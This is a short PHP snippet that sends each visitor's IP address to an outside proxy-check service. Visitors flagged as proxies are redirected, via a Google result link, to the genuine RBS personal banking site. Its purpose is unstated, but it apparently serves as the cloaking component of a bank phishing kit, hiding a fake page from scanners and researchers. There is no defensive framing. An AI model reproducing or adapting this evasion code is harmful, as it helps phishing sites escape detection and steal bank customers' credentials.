<?php

# Visitor proxy check snippet

$v_ip = $_SERVER['REMOTE_ADDR'];
$arContext['http']['timeout'] = 10;
$context = stream_context_create($arContext);

$response = file_get_contents('http://www.shroomery.org/ythan/proxycheck.php?ip='.$v_ip, 0, $context);

if ($response == 'Y') {

        header("Location: https://www.google.ie/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwj5w4vEuanLAhUGuRQKHYd_D4MQFggbMAA&url=http%3A%2F%2Fpersonal.rbs.co.uk%2F&usg=AFQjCNFYepvxIdwo2Mjnx1bPJfbEHs3vQw&bvm=bv.116274245,d.d24");
		die();
}

?>